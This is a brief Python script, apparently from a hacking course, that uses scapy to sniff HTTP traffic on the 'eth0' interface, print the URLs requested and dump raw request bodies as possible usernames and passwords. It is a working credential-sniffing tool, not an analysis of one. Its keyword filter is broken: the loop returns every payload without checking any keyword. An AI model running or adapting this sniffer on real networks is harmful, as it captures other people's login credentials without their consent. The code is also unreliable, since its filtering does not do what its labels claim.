#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    packet = scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            return load
            # print("\n\n\n[+] Possiable username/pass: " + load + "\n\n\n")
            # break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request: " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possiable username/pass: " + str(login_info) + "\n\n")

sniff("eth0")
